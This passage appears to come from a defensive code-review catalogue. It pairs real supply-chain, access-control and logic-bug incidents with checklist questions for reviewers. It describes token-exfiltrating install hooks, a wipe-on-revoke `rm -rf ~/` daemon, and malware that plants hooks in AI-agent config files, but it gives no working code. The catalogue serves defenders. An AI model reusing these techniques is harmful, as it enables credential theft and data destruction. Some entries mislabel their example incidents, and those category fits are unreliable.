**The Bug:** Direct file access URLs that don't check authorization — internal files,
source code, or user data accessible without proper access controls. In October 2021,
an anonymous hacker leaked 125GB of Twitch's internal data, including the complete source
code for Twitch.tv and its mobile applications, internal security tools, proprietary SDKs,
an unreleased Steam competitor (codenamed Vapor), and three years of creator payout data.
The breach was attributed to a server misconfiguration change that exposed an internal
code server to the internet without authentication. The leaked data revealed that internal
file storage and code repositories lacked defense-in-depth — once the perimeter was
breached, there were no additional authorization checks on individual resources.
**Why Missed:** Internal file servers and code repositories are typically considered
"behind the firewall" and therefore trusted. The misconfiguration that exposed them was
an infrastructure change, not an application code change. Without defense-in-depth,
a single misconfiguration exposed everything.
**Review Pattern:** FILE_ACCESS_AUTH — "Are uploaded/stored files served through an
authorization-checking endpoint, not directly via static file serving?"

### A24. Admin Panel on Public Internet — Shodan-Discovered Admin Panels
**Project:** Various | **Severity:** High | **Discovered:** Ongoing
**Incident:** Shodan and Censys scans routinely discover thousands of exposed admin panels
(phpMyAdmin, Jenkins, Kubernetes dashboards, cPanel) on the public internet, leading to
widespread compromise campaigns
**The Bug:** Admin interfaces accessible from the public internet without IP restriction
or VPN requirement. The search engines Shodan and Censys continuously scan the internet
and index exposed services. Their results regularly reveal thousands of exposed admin
panels: phpMyAdmin instances, Jenkins dashboards, Kubernetes dashboard UIs, cPanel
installations, and database management tools accessible without any network-level
restrictions. Many of these have default credentials, weak passwords, or known
vulnerabilities. Automated attack campaigns target these exposed panels within hours
of them appearing on the internet, using credential stuffing, known exploit payloads,
and brute-force attacks. The Kubernetes dashboard in particular has been responsible for
numerous cryptomining compromises when exposed without authentication.
**Why Missed:** Developers and operators focus on application-level authentication ("it
has a login page, so it's secure") without considering network-level restrictions. In
cloud environments, the default security group or firewall may allow all inbound traffic.
The admin panel works correctly — it just should not be reachable from the internet.
**Review Pattern:** ADMIN_NETWORK — "Are admin interfaces restricted to internal networks
or VPN? Is there defense-in-depth beyond authentication?"

### A25. Service-to-Service Authentication Missing — Capital One Breach (2019)
**Project:** Capital One | **Severity:** Critical | **Discovered:** 2019
**Incident:** Capital One breach (2019) — a misconfigured WAF allowed SSRF to the EC2
metadata service, and the lack of service-to-service authentication within the VPC
allowed lateral movement to access 106 million customer records
**The Bug:** Internal services communicating without authentication, trusting network
segmentation alone. In the 2019 Capital One breach, the attacker exploited a
misconfigured web application firewall (WAF) to perform SSRF against the EC2 instance
metadata service (169.254.169.254), obtaining IAM role credentials. These credentials
provided access to S3 buckets containing 106 million customer records. The critical
gap was that internal services within Capital One's VPC trusted each other implicitly —
once the attacker had valid IAM credentials from the metadata service, there were no
additional authentication barriers between the compromised WAF instance and the S3
buckets containing customer data. The breach demonstrated that network perimeter security
(VPC boundaries) is insufficient when internal services don't authenticate to each other.
**Why Missed:** The VPC was considered a trust boundary — services inside the VPC were
assumed to be legitimate. The IAM role attached to the WAF instance had overly broad
S3 permissions because "it's internal." The composition of SSRF + metadata service +
broad IAM permissions + no internal auth created the breach path.
**Review Pattern:** ZERO_TRUST — "Do internal services authenticate each other (mTLS,
service tokens)? Network segmentation is not authentication."

---

## Supply Chain & Build System (25 entries)

### S1. xz Backdoor (CVE-2024-3094)
**Project:** xz-utils | **Severity:** Critical | **Discovered:** 2024
**The Bug:** A multi-year social engineering campaign where an attacker ("Jia Tan") gained
maintainer trust over 2.5 years, then injected a backdoor into the xz compression library.
The backdoor targeted OpenSSH (which links liblzma via systemd) and allowed unauthorized
access. Discovered by Andres Freund when he noticed 500ms SSH latency.
**Root Cause:** The malicious code was hidden in binary test files in the release tarballs
(not in the git repository). Modified build scripts (build-to-host.m4) extracted and
compiled the backdoor during the build process. The obfuscation was in multiple layers.
**Why Missed:** Code review of the git repository wouldn't catch it — the payload was only
in release tarballs. The binary test files appeared benign. The social engineering gave the
attacker legitimate commit access. Only 8 commits out of hundreds were malicious.
**Review Pattern:** TARBALL_GIT_DIFF — "Does the release tarball contain files not in the
git repository? Are binary files in the repository truly test data? Does the build system
include unexpected preprocessing steps?"

### S2. event-stream npm Package (2018)
**Project:** event-stream (npm) | **Severity:** Critical | **Discovered:** 2018
**The Bug:** A new maintainer (who took over from the original author) added a dependency
on `flatmap-stream`, which contained obfuscated code targeting the Copay Bitcoin wallet.
The malicious code stole Bitcoin wallet credentials.
**Root Cause:** A burned-out maintainer handed over a popular package (2M+ downloads/week)
to an unknown person. The new dependency was added in a normal-looking commit. The malicious
payload was obfuscated and only activated in specific applications.
**Why Missed:** The maintainer transfer appeared normal. The new dependency's obfuscated
code only activated in specific conditions (Copay wallet). npm doesn't verify new
maintainer identity or review dependency additions.
**Review Pattern:** MAINTAINER_CHANGE — "Has a package recently changed maintainers? Do new
dependencies have significant download counts and established history? Is any code
obfuscated or does it only activate under specific conditions?"

### S3. tj-actions/changed-files Compromise (CVE-2025-30066)
**Project:** GitHub Actions | **Severity:** Critical | **Discovered:** 2025
**The Bug:** The tj-actions/changed-files GitHub Action was compromised — version tags were
retroactively modified to point to a malicious commit. The malicious code dumped CI secrets
from runner process memory to the workflow log.
**Root Cause:** GitHub Actions allows mutable tags. The attacker modified existing version
tags to reference malicious code. Repositories pinning to tags (not commit SHAs) received
the compromised version.
**Why Missed:** Tag-based pinning was the standard practice. The tag names didn't change —
the underlying commit did. There was no notification mechanism for tag modifications.
**Review Pattern:** ACTION_PIN_SHA — "Are GitHub Actions pinned to commit SHAs, not mutable
tags? Are actions from third parties vendored or audited?"

### S4. npm Dependency Confusion — Alex Birsan (2021)
(See I5 for details)
**Review Pattern:** DEPENDENCY_RESOLUTION (same as I5)

### S5. PyPI Typosquatting — Various (ongoing)
**Project:** PyPI | **Severity:** High | **Discovered:** Ongoing
**The Bug:** Malicious packages with names similar to popular packages (`reqeusts` vs
`requests`, `python-nmap` vs `nmap`).
**Review Pattern:** PACKAGE_NAME_VERIFY — "Is the package name exactly correct? Not a
common misspelling or a variant with extra/missing characters?"

### S6-S20. Additional Supply Chain Issues

### S6. GitHub Actions pull_request_target
**The Bug:** Workflows triggered by `pull_request_target` that checkout the PR's head code
run with write permissions and access to secrets, enabling malicious PRs to steal secrets.
**Review Pattern:** PR_TARGET_SAFETY — "Does any pull_request_target workflow checkout PR
code? This gives untrusted code access to secrets."

### S7. Dockerfile Secrets in Build Layers
**The Bug:** Copying secrets into Docker images during build, where they persist in image
layers even if deleted in a subsequent layer.
**Review Pattern:** DOCKER_SECRET_LAYER — "Are any secrets (keys, tokens, passwords)
COPY'd into Docker images? Use multi-stage builds or BuildKit secrets."

### S8. npm postinstall Scripts
**The Bug:** Malicious npm packages using postinstall scripts to execute code during
installation.
**Review Pattern:** INSTALL_SCRIPTS — "Does the package have install lifecycle scripts? Do
they execute arbitrary code?"

### S9. Lock File Manipulation
**The Bug:** PR that modifies package-lock.json/yarn.lock to point to a different registry
or version than the package.json specifies.
**Review Pattern:** LOCK_FILE_REVIEW — "Does the lock file change match the package.json
changes? Are registry URLs in the lock file pointing to expected registries?"

### S10. CI/CD Variable Exposure
**The Bug:** CI/CD secrets exposed to untrusted builds (fork PRs, public branches).
**Review Pattern:** CI_SECRET_SCOPE — "Are CI/CD secrets scoped to protected branches only?
Can fork PRs or public branches access secrets?"

### S11. Binary Blob in Repository
**The Bug:** Binary files (compiled code, encrypted archives) in source repositories that
cannot be meaningfully reviewed.
**Review Pattern:** BINARY_REVIEW — "Can every file in the repository be read and reviewed
as source code? Binary files should have documented provenance."

### S12. Transitive Dependency Vulnerability
**The Bug:** Vulnerable code pulled in through transitive dependencies that the application
doesn't directly depend on.
**Review Pattern:** TRANSITIVE_AUDIT — "Are transitive dependencies scanned for known
vulnerabilities? Is the dependency tree minimized?"

### S13. Version Pinning Without Updates
**The Bug:** Dependencies pinned to exact versions that never get security updates.
**Review Pattern:** PIN_AND_UPDATE — "Are pinned dependencies regularly updated? Pinning
without update policy is technical debt."

### S14. Build Script Injection
**The Bug:** Build scripts (Makefile, setup.py, build.gradle) that download and execute
code from the internet during build.
**Review Pattern:** BUILD_NETWORK — "Does the build process download executable code? Can
the build be reproduced offline?"

### S15. Compromised Build Environment
**The Bug:** Build servers or CI runners shared between trusted and untrusted workloads,
enabling cross-contamination.
**Review Pattern:** BUILD_ISOLATION — "Are build environments ephemeral and isolated? Can
one build affect another?"

### S16. Missing SBOM / Dependency Inventory
**The Bug:** No inventory of dependencies, making it impossible to assess exposure when a
new vulnerability is disclosed (Log4Shell response).
**Review Pattern:** DEPENDENCY_INVENTORY — "Is there a complete inventory of all direct
and transitive dependencies with versions?"

### S17. Helm Chart Values Injection
**The Bug:** Helm templates that don't quote user-provided values, enabling YAML injection
in Kubernetes manifests.
**Review Pattern:** HELM_QUOTE — "Are Helm template values properly quoted? Can user input
in values.yaml inject YAML structure?"

### S18. Terraform State Secrets
**The Bug:** Terraform state files containing plaintext secrets (database passwords, API
keys) stored in shared/public backends.
**Review Pattern:** IaC_STATE_SECRETS — "Does infrastructure-as-code state contain secrets?
Is state storage encrypted and access-controlled?"

### S19. Container Base Image Vulnerabilities
**The Bug:** Docker images based on outdated base images with known vulnerabilities.
**Review Pattern:** BASE_IMAGE_FRESHNESS — "Is the container base image recent and from a
trusted registry? Are base image updates automated?"

### S20. Pre-commit Hook Bypass
**The Bug:** Security checks in pre-commit hooks bypassed with `--no-verify`.
**Review Pattern:** SERVER_SIDE_CHECKS — "Are security checks enforced server-side (CI/CD),
not just in client-side hooks that can be bypassed?"

### S21. Shai-Hulud v1 — npm Worm (September 2025)
**Project:** npm ecosystem | **Severity:** Critical | **Discovered:** September 2025
**The Bug:** First self-replicating npm worm. A poisoned package's preinstall hook
exfiltrated the developer's npm token + GitHub token, then used those tokens to publish
poisoned versions of every package the victim had write access to. Each new infection
became a new propagation source.
**Root Cause:** npm's Trusted Publishing / OIDC and long-lived `NPM_TOKEN`s were treated as
single trust decisions — once on the dev machine, the token could mint publish rights
across the maintainer's entire package surface. Lifecycle scripts (`preinstall`) executed
unconditionally on `npm install`.
**Why Missed:** Standard advice ("pin versions, review lockfile diffs") doesn't help when
a legitimate maintainer's account publishes a poisoned version of a package you've trusted
for years. The worm spread faster than per-package advisories could be written.
**Review Pattern:** WORM_TOKEN_BLAST — "Can any single dev-machine compromise mint
publish rights across the maintainer's entire package portfolio? Is Trusted Publishing
scoped per job and gated behind a protected environment?"

### S22. Shai-Hulud 2.0 / Sha1-Hulud (November 24, 2025)
**Project:** npm ecosystem | **Severity:** Critical | **Discovered:** November 2025
**The Bug:** Second wave compromised ~1,000 npm packages and leaked credentials for
25,000+ GitHub repositories. The malware injected two files (`setup_bun.js`,
`bun_environment.js`) into legitimate packages and triggered them via a new `preinstall`
script. Exfiltrated credentials were published to public GitHub repos described as
"Sha1-Hulud: The Second Coming."
**Root Cause:** Same `preinstall` execution surface as S21, with refined payload delivery.
The public-repo exfiltration channel was novel — it abused GitHub's own infrastructure as
C2 by creating attacker-readable repos under each victim's account.
**Why Missed:** `ignore-scripts=true` defenses rolled out after S21 were incomplete in
practice (default config in most CI images had `ignore-scripts=false`), and lockfile
review didn't catch versions published by legitimate, trusted maintainer accounts.
**Review Pattern:** PREINSTALL_INJECTION — "Does any installed package inject new
`preinstall`/`postinstall` scripts that weren't in the prior version? Is the project's
GitHub account configured to require review on new public-repo creation by automation?"

### S23. Mini Shai-Hulud — SAP / Packagist (April 2026)
**Project:** npm + Packagist | **Severity:** Critical | **Discovered:** April 2026
**The Bug:** Variant dubbed "Mini Shai-Hulud" targeted SAP's npm packages with Bun-based
payloads, then jumped ecosystems: an Intercom PHP package on Packagist spread the worm via
a malicious Composer plugin. First confirmed cross-ecosystem reach.
**Root Cause:** Build-time code execution surfaces in *every* package registry, not just
npm. Composer plugins are functionally equivalent to npm lifecycle scripts, and PyPI
`setup.py` had similar reach.
**Why Missed:** Teams thought of Shai-Hulud as an "npm problem" and missed that the same
attacker (TeamPCP) was generalising. Composer plugin review is rare; PyPI `setup.py`
review is rarer.
**Review Pattern:** CROSS_ECOSYSTEM_WORM — "Are install-time execution surfaces in *all*
package managers used by the project audited the same way (Composer plugins, PyPI
`setup.py`, npm lifecycle scripts, RubyGems extension build)?"

### S24. Mini Shai-Hulud — TanStack / OpenAI (May 11, 2026)
**Project:** npm ecosystem | **Severity:** Critical | **Discovered:** May 2026
**The Bug:** TeamPCP compromised TanStack's release infrastructure via a chained GitHub
Actions attack: `pull_request_target` running fork code, Actions cache poisoning, and
runtime extraction of the OIDC token from the GitHub Actions runner process memory. Used
the stolen OIDC token to mint npm publish credentials and ship 84 malicious versions
across 42 `@tanstack/*` packages in six minutes. The campaign also infected two OpenAI
employees' devices, forcing rotation of OpenAI's macOS-product signing certificates. The
payload included a `gh-token-monitor` daemon that polled GitHub every 60s and attempted
`rm -rf ~/` on token revocation (auto-exit after 24h).
**Root Cause:** Three independent GitHub Actions design flaws chained: (1) `pull_request_target`
gives fork code write permissions, (2) Actions cache persists across triggers without trust
isolation, (3) OIDC tokens live in runner process memory long enough to be read by
co-located workloads. Together they bypass every per-step permission scope.
**Why Missed:** Each of the three primitives was individually known and individually
"acceptable risk"; their chain was not in the published threat models. The wipe-on-revoke
daemon also reframed incident response: rotating a token is no longer obviously safe.
**Review Pattern:** OIDC_CACHE_CHAIN — "Does any `pull_request_target` workflow run fork
code in a job that has `id-token: write` or shares a cache key with a publishable job?
Does the incident-response playbook for credential theft assume the credential might be
guarding a destructive handler?"

### S25. TeamPCP Source-Code Leak (May 12, 2026)
**Project:** Public threat-actor framework | **Severity:** Critical | **Discovered:** May 2026
**The Bug:** TeamPCP published the complete Shai-Hulud framework to GitHub under the MIT
License with deployment instructions; commits dated 2099-01-01 for obfuscation. The
framework is a modular TypeScript/Bun toolkit for credential harvesting, registry
poisoning, and encrypted exfiltration. Notably includes code that modifies Claude Code's
`settings.json` to register hooks that execute the malware on agent start. GitHub removed
the repos within hours; forks spread immediately and independent actors began iterating on
the codebase.
**Root Cause:** Not a code bug — a threat-actor amplification event. Open-sourcing the
framework moves it from "one crew's tool" to a commodity supply-chain attack platform.
**Why Missed:** N/A — defensive implication is the relevant takeaway: any future review
should now assume the attacker has the full framework, including the AI-agent-config
persistence module. Defenders should add AI-agent-config files
(`~/.claude/settings.json`, `~/.cursor/`, `~/.continue/`, MCP server configs) to their
inventory of credential-equivalent surfaces.
**Review Pattern:** AI_AGENT_CONFIG_WRITE — "Does any installed package or install hook
read from or write to AI agent config directories? Are agent hooks, MCP servers, and
skills auto-loaded from disk treated as executable trust decisions and reviewed as such?"

---

## Logic & Correctness (25 entries)

### L1. Apple goto fail (CVE-2014-1266)
(See C2 for details — dual-listed as it's both a crypto and logic bug)

### L2. Let's Encrypt Boulder Authorization Bug (2020)
(See M40 for details)

### L3. Off-by-One in Boundary Checks — General pattern
**The Bug:** `if (index < array_length)` vs `if (index <= array_length)` — the difference
between correct and buffer overflow. Also: `for (i = 0; i <= n; i++)` iterating n+1 times.
**Root Cause:** Fence-post errors in boundary conditions, especially around 0-based vs
1-based indexing, inclusive vs exclusive bounds.
**Review Pattern:** BOUNDARY_CONDITION — "Does the comparison use < or <=? Is the bound
inclusive or exclusive? Count the elements: does the loop iterate the expected number of
times? Check both empty (n=0) and single-element (n=1) cases."

### L4. Null Pointer Dereference After Null Check — General pattern
**The Bug:** Code that checks for null but continues to use the pointer on the error path:
```c
if (ptr == NULL) {
    log("ptr is null: %s", ptr->name);  // dereference on error path
    return -1;
}
```
Or code that checks for null after already dereferencing:
```c
val = ptr->field;  // dereference first
if (ptr == NULL) return -1;  // check after — too late
```
**Review Pattern:** NULL_BEFORE_USE — "Is every pointer/reference checked for null BEFORE
its first dereference? Is the null check on every path, not just the happy path?"

### L5. Error Code Ignored — General pattern
**The Bug:** Functions that return error codes or error objects that are silently ignored:
```go
file, _ := os.Open(path)  // error ignored
result := json.Unmarshal(data, &obj)  // error not checked
```
**Review Pattern:** ERROR_CHECKED — "Is every error return value checked and handled? In
Go: is `_` used to discard an error? In C: is the return value of close/write/malloc
checked?"

### L6. Wrong Comparison Operator — General pattern
**The Bug:** Using `=` instead of `==` (C/C++/PHP), `==` instead of `===` (JavaScript/PHP),
or `is` instead of `==` (Python for non-singletons).
**Review Pattern:** COMPARISON_OPERATOR — "Is the correct comparison operator used? In C:
assignments in conditions. In PHP/JS: strict vs loose equality."

### L7. Integer Truncation on Platform Differences
**The Bug:** Code that works on 64-bit but fails on 32-bit (or vice versa) due to integer
size differences, pointer size assumptions, or size_t width differences.
**Review Pattern:** PORTABILITY_INT — "Does the code assume specific integer sizes? Are
size_t, ptrdiff_t, and pointer sizes used correctly for the target platforms?"

### L8. Floating Point Comparison — General pattern
**The Bug:** Using `==` to compare floating-point numbers, which fails due to precision:
```python
0.1 + 0.2 == 0.3  # False
```
**Review Pattern:** FLOAT_COMPARE — "Are floating-point comparisons using an epsilon/
tolerance? For monetary values, use fixed-point/decimal types."

### L9. Time Zone and DST Bugs — General pattern
**The Bug:** Assuming days are 24 hours, hours are 60 minutes, or that time zones are
fixed offsets. DST transitions can create impossible times, duplicate times, or 23/25-hour
days.
**Review Pattern:** TIME_SAFETY — "Does date/time code handle DST transitions, leap seconds,
and variable-length months? Use UTC for storage and computation."

### L10. Unicode Normalization in Identifiers — General pattern
**The Bug:** Two usernames that look identical but are different at the byte level (Latin
'a' vs Cyrillic 'а'), allowing impersonation or duplicate accounts.
**Review Pattern:** IDENTIFIER_NORMALIZATION — "Are user-facing identifiers normalized
(NFKC) before comparison and storage? Are confusable characters handled?"

### L11-L25. Additional Logic Bugs

### L11. Incorrect Default Case in Switch — Apple goto fail (CVE-2014-1266)
**Project:** Apple SecureTransport | **Severity:** Critical | **Discovered:** 2014
**Incident:** Apple's goto fail (CVE-2014-1266) is essentially a missing-brace/default
issue — the control flow fell through because the language allowed a bare statement
outside an if-block without warning (see C2 for full details)
**The Bug:** Switch/case without default, or with a default that doesn't handle all
possibilities, leading to undefined behavior or silent failures. Apple's goto fail
illustrates the broader pattern: when control flow has an implicit "fall-through" or
"do nothing" default, critical security checks can be silently skipped. The duplicated
`goto fail;` statement executed unconditionally because there was no explicit block
structure enforcing that the statement belonged to the preceding `if`. In switch/case
contexts, the same pattern appears when a missing `default:` case or missing `break`
statement allows execution to silently skip validation or fall through to unintended
code paths.
**Why Missed:** Compilers don't warn about missing defaults in switch statements (unless
configured to). The code "works" for all tested inputs — the missing case only matters
for unexpected values. In Apple's case, the duplicated line looked like a harmless
copy-paste artifact.
**Review Pattern:** SWITCH_EXHAUSTIVE — "Does every switch/match statement handle all
possible values, including unexpected ones?"

### L12. Resource Cleanup in Exception Path — runc Container Escape (CVE-2019-5736)
**Project:** runc/Docker | **Severity:** Critical | **Discovered:** 2019
**Incident:** CVE-2019-5736 (runc container escape) had resource cleanup issues where
file descriptors and process state were not properly cleaned up in error paths, leaving
the host runc binary vulnerable to overwrite (see A5 for full details)
**The Bug:** Resources allocated before a try block not cleaned up when an exception or
error occurs before the resource is assigned to a managed variable. In CVE-2019-5736,
runc's error handling during container exec operations did not properly clean up file
descriptors and process state. The /proc/self/exe file descriptor remained accessible
from within the container namespace even when the exec operation encountered an error.
A malicious container could exploit this by forcing error conditions during exec, then
using the leaked file descriptor to access and overwrite the host's runc binary. The
broader pattern applies universally: file descriptors, network connections, lock files,
and temporary files that are not cleaned up in error paths become resource leaks at
best and security vulnerabilities at worst.
**Why Missed:** Error paths are less tested than happy paths. The resource cleanup at the
end of the function is correct for the normal case, but early returns and exception
handlers bypass it. The leak is invisible unless you trace every error path and verify
that every allocated resource is released.
**Review Pattern:** RAII_CLEANUP — "Are resources acquired in a try-with-resources, defer,
or RAII pattern? Can an exception between allocation and cleanup leak the resource?"

### L13. Incorrect Regex Anchoring — WAF Bypass Patterns
**Project:** Various WAFs (ModSecurity, cloud WAFs) | **Severity:** High | **Discovered:** Ongoing
**Incident:** Numerous documented WAF bypass techniques exploiting unanchored regex rules,
enabling SQL injection and XSS bypasses against ModSecurity, AWS WAF, and Cloudflare WAF
**The Bug:** Input validation using unanchored regex: `/^admin/` matches "admin_evil" but
doesn't require full-string match. Need `/^admin$/`. This pattern is pervasive in Web
Application Firewall rules and input validation. WAF rules using patterns like
`/SELECT.*FROM/` to detect SQL injection can be bypassed by prepending or appending
characters that the regex doesn't account for. Researchers have demonstrated bypasses of
major WAF products by exploiting: unanchored patterns that only check the beginning of
input, regex patterns that don't account for URL encoding or Unicode, and rules that
match on individual parameters but don't account for parameter pollution. The OWASP
ModSecurity Core Rule Set has undergone multiple revisions to tighten regex anchoring
after bypass discoveries.
**Why Missed:** The regex "matches" the malicious input in simple tests. The bypass
requires crafting input that satisfies the application's parser while evading the regex.
WAF rule authors focus on matching known-bad patterns rather than ensuring no additional
characters can be appended or prepended.
**Review Pattern:** REGEX_ANCHOR — "Are validation regexes anchored at both start (^) and
end ($)? Can an attacker append extra characters?"

### L14. Short-Circuit Evaluation Side Effects — JavaScript Frameworks
**Project:** Various JavaScript/TypeScript frameworks | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** A well-known pattern in JavaScript frameworks where short-circuit evaluation
in conditional rendering and validation causes missing side effects — documented across
React, Vue, and Angular codebases
**The Bug:** Relying on side effects in short-circuit expressions where the second operand
may not execute: `if (shouldLog && log(message))`. In JavaScript frameworks, short-circuit
evaluation is commonly used for conditional rendering (`condition && <Component />`) and
optional chaining (`data?.value`). The pattern becomes dangerous when side effects are
placed in the short-circuited branch: `isValid && saveToDatabase(data)` silently skips
the save when isValid is false, but if isValid is undefined or null (rather than
explicitly false), the entire expression evaluates to undefined — which in React JSX
renders as nothing, but in other contexts may be coerced to false or produce unexpected
behavior. The pattern is especially insidious in validation chains where
`validateA() && validateB() && validateC()` stops at the first falsy return, silently
skipping later validations that may have important side effects.
**Why Missed:** Short-circuit evaluation is idiomatic in JavaScript. The pattern is
concise and readable. The missing side effect only manifests when the left operand is
falsy, which may not occur in happy-path testing.
**Review Pattern:** SHORT_CIRCUIT_SIDE_EFFECTS — "Do short-circuit expressions (&&, ||)
have side effects in the right operand that might not execute?"

### L15. Modulo Bias in Random Number Generation — Debian OpenSSL (CVE-2008-0166)
**Project:** Various / Debian OpenSSL | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** Related to CVE-2008-0166 (Debian OpenSSL) — the reduced entropy space made
modulo bias practically relevant, and the broader pattern has been documented in multiple
cryptographic implementations
**The Bug:** `rand() % n` introduces bias when `RAND_MAX + 1` is not divisible by `n`.
Lower values are more likely. When the random source has limited range (as in the Debian
OpenSSL disaster where only 32,768 values were possible), modulo bias becomes
catastrophically significant. But even with a proper CSPRNG, modulo bias matters for
security applications. If a 256-bit random value is reduced to a range of 0..n by simple
modulo, and n is not a power of 2, some values are up to twice as likely as others. For
cryptographic applications like generating random nonces, key material, or selecting
random padding, even small biases can leak information. The correct approach is rejection
sampling: generate a random value, and if it falls outside the largest multiple of n
that fits in the output range, discard it and try again.
**Why Missed:** `rand() % n` is the obvious way to get a number in a range, and it
produces values that "look random" in testing. The bias is statistical — it cannot be
detected by looking at individual outputs, only by analyzing the distribution of millions
of outputs.
**Review Pattern:** MODULO_BIAS — "Does random number range reduction use rejection sampling
or other bias-free methods, not simple modulo?"

### L16. Wrong Hash for Data Structure Key — Python Dict Key Mutation
**Project:** Python / CPython | **Severity:** Medium | **Discovered:** Ongoing
**Incident:** Well-documented pattern in Python bug reports and StackOverflow — mutable
objects used as dict keys produce silent data loss and unreachable entries
**The Bug:** Mutable objects used as hash map keys. When the object is mutated, its hash
changes and it becomes unreachable in the map. Python explicitly prevents using lists as
dict keys (they're unhashable), but custom objects that implement `__hash__` based on
mutable state create the same problem silently. When a key object is mutated after
insertion, its hash changes, but its position in the hash table does not. Lookups using
the mutated object compute a different hash and search a different bucket — the entry
exists but is unreachable. The data appears to have vanished. In CPython bug reports,
this pattern has been reported multiple times by developers who used objects with mutable
fields as dictionary keys or set members, then were confused when the objects "disappeared"
from the collection after mutation. The standard library's documentation warns about this,
but the warning is easy to miss.
**Why Missed:** The initial insertion works. The mutation is a separate operation that
doesn't raise an error. The lookup failure looks like a missing key, not a corruption.
Debugging requires understanding hash table internals to realize the key is in the wrong
bucket.
**Review Pattern:** HASH_KEY_IMMUTABLE — "Are hash map keys immutable? Will mutation change
their hash or equality?"

### L17. Calendar Date Arithmetic Errors — Cloudflare and Google Calendar Outages
**Project:** Cloudflare, Google Calendar, and others | **Severity:** Medium-High | **Discovered:** Various
**Incident:** Cloudflare's 2017 leap year-related outage and multiple Google Calendar
timezone/DST bugs that caused meetings to shift or disappear during daylight saving
time transitions
**The Bug:** Adding 30 days instead of one month, not handling leap years, or treating
"end of month" incorrectly (Jan 31 + 1 month = ?). Cloudflare experienced an outage
related to date arithmetic where a certificate validity check incorrectly computed a
date boundary near a leap year transition. Google Calendar has had recurring bugs where
recurring meetings shift by one hour during DST transitions or disappear entirely when
they fall in the "gap" hour (e.g., 2:30 AM doesn't exist on spring-forward day). The
underlying issue is that calendar arithmetic is not simple addition: months have different
lengths, leap years add a day, DST transitions create 23-hour and 25-hour days, and
"one month from January 31" has no obvious answer (February 28? March 3? March 2 in
leap years?). Code that uses raw second/day arithmetic instead of proper date libraries
inevitably gets these edge cases wrong.
**Why Missed:** Date arithmetic seems simple — everyone knows how calendars work. The edge
cases (leap seconds, DST, variable month lengths) occur infrequently and in predictable
patterns, so they're easy to miss in testing. Raw arithmetic (add 86400 seconds = one
day) works for 363 out of 365 days per year.
**Review Pattern:** DATE_ARITHMETIC — "Is date arithmetic using a proper date library
rather than raw day/second arithmetic?"

### L18. Boolean Logic Inversion — Security Check Bypass Patterns
**Project:** Various | **Severity:** High | **Discovered:** Ongoing
**Incident:** Multiple documented cases of boolean logic errors in security checks,
including authentication bypass bugs where `!isAdmin || !isActive` (blocks if either is
false) was intended as `!isAdmin && !isActive` (blocks only if both are false)
**The Bug:** `if (!isValid || !isAuthorized)` when the intent was `if (!isValid &&
!isAuthorized)`. De Morgan's Law errors in complex boolean expressions. In security-
critical code, this class of bug is especially dangerous because the difference between
OR and AND in a negated condition determines whether a check is "block if ANY condition
fails" versus "block only if ALL conditions fail." A common pattern: `if (!isAuthenticated
|| !hasPermission) { deny(); }` correctly denies if either check fails. But
`if (!isAuthenticated && !hasPermission) { deny(); }` only denies when BOTH fail,
meaning an authenticated user without permission, or a user with permission who isn't
authenticated, passes through. The error is especially common when refactoring: extracting
a negated condition to a helper function and forgetting to apply De Morgan's Law
(NOT (A AND B) = (NOT A) OR (NOT B)).
**Why Missed:** Boolean expressions with multiple negations are hard to reason about
mentally. The code compiles and passes tests where both conditions are true or both are
false. The bug only manifests for the "mixed" truth table entries that may not have
test coverage.
**Review Pattern:** BOOLEAN_LOGIC — "In complex boolean expressions with negation: apply
De Morgan's Law mentally. Does the condition match the intent for all truth table combinations?"

### L19. Incorrect String Encoding Assumption — MySQL utf8 vs utf8mb4 Truncation
**Project:** MySQL | **Severity:** Medium-High | **Discovered:** Ongoing
**Incident:** MySQL's `utf8` charset only supports 3-byte UTF-8 (BMP characters), silently
truncating 4-byte characters (emoji, some CJK). This has been exploited for security
bypasses via string truncation attacks
**The Bug:** Assuming strings are ASCII or fixed-width when they're variable-width UTF-8,
leading to incorrect length calculations, incorrect slicing, or security-relevant
truncation. MySQL's `utf8` character set is actually `utf8mb3` — it only supports
characters that encode to 3 bytes or fewer in UTF-8. Characters requiring 4 bytes (emoji,
supplementary CJK characters, mathematical symbols) are silently truncated when inserted
into `utf8` columns. This has been exploited in security contexts: an attacker registers
a username like `admin` followed by a 4-byte emoji character and additional text. MySQL
truncates at the 4-byte character, resulting in `admin` being stored. If the application
checks for duplicate usernames before insertion (seeing the full string with emoji) but
MySQL stores the truncated version, the attacker ends up with an account named `admin`.
The correct charset is `utf8mb4`, which supports all Unicode characters.
**Why Missed:** MySQL's `utf8` sounds like "UTF-8" — developers reasonably assume it
supports all UTF-8 characters. The silent truncation produces no error or warning (in
non-strict SQL mode). Testing with ASCII-only data never reveals the issue.
**Review Pattern:** STRING_ENCODING — "Does string processing handle multi-byte characters
correctly? Is length measured in bytes, code points, or grapheme clusters?"

### L20. Division by Zero Not Guarded — PHP-FPM (CVE-2019-11043)
**Project:** PHP-FPM | **Severity:** Critical | **Discovered:** 2019
**Incident:** CVE-2019-11043 — a buffer underflow in PHP-FPM caused by incorrect path
length calculations related to division/modulo arithmetic, enabling remote code execution
**The Bug:** Division or modulo where the divisor can be zero or produces an incorrect
result under certain inputs. CVE-2019-11043 in PHP-FPM was triggered when nginx was
configured with `fastcgi_split_path_info` and a crafted URL caused the PATH_INFO to be
empty. The PHP-FPM handler's path length calculation involved arithmetic that produced
an underflow when the path info length was zero, causing a buffer underflow that
overwrote adjacent memory. With carefully crafted requests, attackers could achieve
remote code execution. The vulnerability required a specific nginx configuration
(commonly recommended in tutorials), making it widely exploitable. The core issue was
arithmetic on lengths that could be zero, without guarding the division/subtraction
that followed.
**Why Missed:** The PATH_INFO is almost always non-empty in normal requests. The
arithmetic looked correct for the common case. The nginx configuration that triggered
the bug was recommended in official documentation. The underflow only occurred with a
specific URL pattern that normal clients never produce.
**Review Pattern:** DIVISION_GUARD — "Can the divisor ever be zero? Is there a guard before
every division/modulo operation?"

### L21. Infinite Loop on Unexpected Input — libxml2 Parser DoS
**Project:** libxml2 | **Severity:** Medium-High | **Discovered:** Various
**Incident:** Multiple libxml2 CVEs involving infinite loops or excessive CPU consumption
when parsing malformed XML, including entity expansion loops and malformed namespace
declarations
**The Bug:** Parser or state machine that enters an infinite loop when encountering
unexpected input — no progress is made, but no error is raised. libxml2, one of the
most widely used XML parsers (used by Python, PHP, Ruby, and countless Linux
applications), has had multiple vulnerabilities where malformed XML input caused the
